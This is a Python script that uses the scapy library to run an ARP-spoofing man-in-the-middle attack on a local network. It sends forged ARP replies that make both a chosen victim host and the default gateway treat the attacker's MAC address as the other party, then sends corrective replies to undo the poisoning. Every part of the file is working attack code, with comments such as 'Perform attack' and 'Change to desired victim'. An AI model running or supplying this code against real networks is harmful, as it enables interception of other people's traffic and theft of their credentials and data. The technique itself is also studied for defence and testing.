from scapy.all import *

def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = 'en0', inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")
    
def reARP(victim_IP, gateway_IP):
    victim_MAC = get_mac(victim_IP)
    gateway_MAC = get_mac(gateway_IP)

    #Fix victim ARP with default gateway
    arp_response = ARP(op=2, pdst=victim_IP, hwdst=victim_MAC, psrc=gateway_IP, hwsrc=gateway_MAC)
    send(arp_response, iface='en0', verbose=False)

    #Fix default gateway ARP with victim
    arp_response = ARP(op=2, pdst=gateway_IP, hwdst=gateway_MAC, psrc=victim_IP, hwsrc=victim_MAC)
    send(arp_response, iface='en0', verbose=False)

def mitm(victim_IP, gateway_IP, attacker_MAC):

    victim_MAC = get_mac(victim_IP)
    gateway_MAC = get_mac(gateway_IP)

    #Trick the victim into thinking the attacker is the default gateway
    arp_response = ARP(op=2, pdst=victim_IP, hwdst=victim_MAC, psrc=gateway_IP, hwsrc=attacker_MAC)
    send(arp_response, iface='en0', verbose=False)

    #Trick the default gateway into thinking the attacker is the victim
    arp_response = ARP(op=2, pdst=gateway_IP, hwdst=gateway_MAC, psrc=victim_IP, hwsrc=attacker_MAC)
    send(arp_response, iface='en0', verbose=False)

if __name__ == '__main__':
    #Change to desired victim
    victim_IP = "192.168.1.44"

    #Change to your networks default gateway
    gateway_IP = "192.168.1.1"

    #Change to attack MAC
    attacker_MAC = "5c:aa:fd:97:c8:73"

    #Perform attack
    mitm(victim_IP, gateway_IP, attacker_MAC)

    #Undo attack
    reARP(victim_IP, gateway_IP)